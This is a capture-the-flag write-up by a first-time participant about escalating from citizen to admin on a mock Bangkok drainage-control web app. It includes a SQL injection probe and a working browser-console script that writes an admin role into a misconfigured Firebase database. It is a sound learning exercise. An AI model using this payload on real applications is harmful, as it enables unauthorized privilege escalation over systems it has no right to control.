# CTF Mini Web 2025/2
* Category: Web Exploitation
* Point: 25
* Rank: 31/67
* Mode: Single player

This was my very first participant in any CTF. Event hoster is STH Lab, which is given me such a great experiences, opputunities from tried real practical skills.

And below from now on, this is how I go throught a challenge.

# Challenge
<img width="1529" height="822" alt="ctf1" src="https://github.com/user-attachments/assets/0014182f-fe7f-44fd-8b4b-dba9636e8ad5" />

***

> Challenge is given you a page of "ระบบควบคุมสถานีระบายน้ำ กรุงเทพมหานคร" (Bangkok Drainage Station Control System) which containing 2 main boxes
>
> 1.Register - this founction provided 2 input and 1 button
> 
>   * Email 
>   * Password 
>   * Register button
> 
> A short description is; When new profile is registered, system automatically add "Citizen" privilege
> 
> 2.Login - this founction provided the same as first main box
> 
>   Email - name@domain.com
>   Password -
>   Register button

***

# Recon & Analysis

I initially put a simplest well-known exploit to investigate - Limit input length, of course they're none limited, then I registered to system and move on to Login box , filled up username as usual, but this time I tried ' OR 1=1 on Password input, system showing error along with "Username or Password incorrect".

When it's not work at all, I skipped and do login.

<img width="738" height="739" alt="ctf2" src="https://github.com/user-attachments/assets/63006f24-a040-41c6-9cf2-0e81fee2e85e" />

***

As soon as I'm inside, a page show up as "สรุปสถานะบัญชี" (Account summary status) on a very top, noticed that my status is 'CITIZEN' and with next boxes below "มอนิเตอร์ระดับน้ำ" (Water levels monitor), showing data and output etc., seem normal to me.

But final line is caught my attension; **Mission Channel: ops-override**.

That's mean, privilege escalation is awnser, but how?

<img width="1520" height="814" alt="ctf3" src="https://github.com/user-attachments/assets/091960ad-cc71-4289-8720-90980a0cd4ce" />

***

Press F12 to opens developer tools, then clicks at 'Sources' on Menu taps, selected following files.

<pre>
  └── top
    ├── minictf2.p7z.pw
      ├── assets
        ├── script.js <== **now we focus on this file**
        ├── styles.css
      ├── cdn-cgi/scrpts/7d0fa10...
          (index)
    ├── .....
    ├── .....
    └── 
</pre>

<img width="1597" height="776" alt="ctf4" src="https://github.com/user-attachments/assets/2ded835b-56c5-4ecc-bf09-3f12074f7166" />

***

Start with press 'Ctrl+Shift+F' and type 'CITIZEN' to find what I might found, as you can see at between line 135 to 152 they obviously are fountion subscribeProfile(user) which is refers to how they manage to get and data from firebase with line 139.

<pre>const userRef = ref(db, `users/${user.uid}`);</pre>

I scrolling down more, then my eyes caught at line between 142 to 154,

<pre>
userRole = data.role || 'citizen';
        profileRole.textContent = userRole.toUpperCase();
        hasControlUnlocked = Boolean(data.controlUnlocked);
        userOverrideChannel = data.overrideChannel || '';
        userOverrideKey = data.overrideKey || '';
        userBadge = data.badge?.toUpperCase?.() || 'STANDARD';
        if (userRole === 'admin' && hasControlUnlocked) {
            adminCard.style.display = 'block';
            adminHint.textContent = 'คุณมีสิทธิ์ควบคุมการเปิด-ปิด ระบบระบายน้ำ';
        } else {
            adminCard.style.display = 'none';
        }
    });
</pre>

What's meaning behind these line? when admin && hasControlUnlocked is true, variable userRole will get 'show block' and 'Conten "คุณมีสิทธิ์ควบคุมการเปิด-ปิด ระบบระบายน้ำ" (You have authorized to control open-close draiange system)'. FireDatabase fully trusting Data on Cliet-side without verify anything.

And line between 217 to 237

<pre> 
if (toggleBtn) {
    toggleBtn.addEventListener('click', async () => {
        if (userRole !== 'admin') {
            alert('คุณไม่มีสิทธิ์ควบคุมระบบ');
            return;
        }
        const user = auth.currentUser;
        if (!user) { return; }
        const newStatus = currentStatus === 'open' ? 'closed' : 'open';
        const statusText = newStatus === 'closed'
            ? 'คำสั่งปิดประตูระบายน้ำทั้งหมดเพื่อทดสอบระบบน้ำท่วม'
            : 'กลับมาเปิดระบายน้ำตามปกติ';
        await update(ref(db, `controls/users/${user.uid}`), {
            drainageStatus: newStatus,
            statusMessage: statusText,
            averageLevel: newStatus === 'closed' ? 2.05 : 1.24,
            updatedBy: user.email,
            lastUpdated: new Date().toISOString(),
        });
        if (newStatus === 'closed') {
            requestFlag();
</pre>

These line is pimary key to get flag, FireDatabase require data from var 'user' to update from db. If I somehow manage to inject script like directly to Database for set new privilege, I'll get flag.

***

# Solving
I start to do solution with JavaScript script, read comment for understading what each of lines do.

<pre>
(async () => {
  // 1. Import library ที่เว็บใช้งานมาเพื่อใช้กับ payload ของเรา
  const { getApp } = await import('https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js');
  const { getDatabase, ref, update, get } = await import('https://www.gstatic.com/firebasejs/12.6.0/firebase-database.js');
  const { getAuth } = await import('https://www.gstatic.com/firebasejs/12.6.0/firebase-auth.js');

  // 2. อ่าน Config จากหน้าเว็บเพื่อดึง URL ที่ถูกต้อง
  const cfgElement = document.getElementById('firebase-config');
  if (!cfgElement) { 
  console.error("❌ ไม่พบ Config ในหน้าเว็บ"); 
  return; 
  }
  const cfg = JSON.parse(cfgElement.textContent);
  
  // 3. ดึง App เดิมที่รันอยู่ขึ้นมา
  const app = getApp();
  
  // 4. เชื่อมต่อ Database (ใส่ URL ให้ตรงกับต้นฉบับ เพื่อแก้ Error)
  const db = getDatabase(app, cfg.databaseURL);
  const auth = getAuth(app);
  const user = auth.currentUser;

  console.log(`Target User: ${user.email} (${user.uid})`);

  // 5. นี้คือ Payload ยัดเยียดความเป็น ADMIN ให้ User ที่เราใช้งานอยู่
  try {
    await update(ref(db, `users/${user.uid}`), {
        role: 'admin',           // เปลี่ยน role เป็น admin
        controlUnlocked: true,   // ปลดล็อกปุ่มควบคุม
    });
    
    console.warn("✅ SUCCESS: เจาะสำเร็จ!"); //อันนี้เพื่อไว้เตือนว่า เราเจาะเข้าระบบสำเร็จ
    
  } catch (err) {
    console.error("❌ Write Failed :", err); //อันนี้เพื่อไว้เตือนว่า เราเจาะเข้าระบบไม่สำเร็จ
  }
})();
</pre>

Moment of truth, I'm in (Finally, my whole 2 days attempt)

<img width="1600" height="819" alt="ctf5" src="https://github.com/user-attachments/assets/d83fb0e3-9b69-4836-8e54-f7e077fd48de" />

***

# Flag:

Refresh (F5) one time, I got ADMIN privilege and button "ปิดระบบระบายน้ำชั่วคราว" appears

If you curious "Why you have almost identical Ray@gmail.com for Login", well, at this point, this is my second time to solve CTF, so unfortunately, flag doesn't show up at all

Instead I posted images of proof that I actually get flag and rank in place

<img width="1600" height="825" alt="ctf7" src="https://github.com/user-attachments/assets/50517d68-3a38-42e7-b4ad-8dbbb858516c" />

***

<img width="1600" height="823" alt="ctf8" src="https://github.com/user-attachments/assets/53a7bccc-1415-4ecb-9bd7-a11c3c6539be" />

***

# That's it!, my first ever CTF, thank you Siam Thanat Hack Co., Ltd. (STH) for this fun challenge!. You gave me a huge opputurnity to test my skills on real-world cybersecurity.


